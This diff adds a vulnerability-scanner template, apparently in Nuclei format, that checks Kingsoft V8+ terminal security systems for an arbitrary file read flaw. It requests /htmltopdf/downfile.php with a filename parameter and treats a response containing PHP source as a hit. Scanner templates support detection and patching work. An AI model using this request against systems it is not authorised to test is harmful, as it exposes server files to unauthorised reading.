@@ -1,0 +1,21 @@
+id: Kingsoft-v8-fileRead
+info:
+  author: Str1am
+  name: "\u91D1\u5C71V8+\u7EC8\u7AEF\u5B89\u5168\u7CFB\u7EDF\u4EFB\u610F\u6587\u4EF6\
+    \u8BFB\u53D6"
+  severity: high
+  tags: Kingsoft,fileRead
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - $filename
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/htmltopdf/downfile.php?filename=downfile.php'
